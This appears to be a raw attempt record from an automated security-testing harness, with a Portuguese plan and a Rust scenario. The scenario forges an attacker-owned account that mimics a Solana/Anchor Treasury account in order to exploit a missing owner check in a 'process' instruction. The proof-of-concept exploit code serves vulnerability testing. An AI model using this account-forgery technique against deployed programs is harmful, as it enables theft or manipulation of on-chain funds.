attempts.raw:
{
  "plan": "O baseline inicializa uma conta Treasury legitima com authority = carteira do usuario, balance = 1000 e is_active = true, provando que o cenario esta montado corretamente. O ataque chama `process` passando, no lugar da treasury legitima, uma conta forjada cujo dono e o programa do atacante (env.attacker_program) e cujos dados imitam o layout de Treasury com is_active = true. Como `process` recebe `treasury` como AccountInfo e nao valida o owner, a leitura dos bytes forjados deve ser aceita. O efeito medido e que a conta forjada, com dono diferente do programa-alvo, foi aceita e usada pela instrucao.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

let attacker_program = env.attacker_program.expect("attacker program required");

// Conta Treasury legitima, criada pelo baseline
let treasury_legit = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

let init_ix = env.anchor_ix(
    "initialize",
    &(1000u64,),
    &[
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);

let init_accounts = vec![
    (treasury_key, treasury_legit),
    (authority, authority_account),
    (system_program_id, system_program_account),
];

let baseline = env.baseline("initialize legitimo", &init_ix, &init_accounts);

// Conta forjada: dono e o programa do atacante, dados imitam Treasury
let forged_data = anchor_account_data(
    "Treasury",
    &(authority, 999_999u64, true),
);
let forged_treasury = account(&attacker_program, &forged_data, None);

let process_ix = env.anchor_ix(
    "process",
    &(),
    &[
        AccountMeta::new_readonly(treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let attack_accounts = vec![
    (treasury_key, forged_treasury),
    (authority, wallet(1_000_000_000)),
];

let r = env.attack("process com treasury forjada de outro dono", &process_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let used = after(&r, &treasury_key);
    env.effect(
        "conta forjada com dono diferente do programa foi aceita e usada",
        used.owner() == &attacker_program && used.data() == forged_data.as_slice(),
    );
}"
}

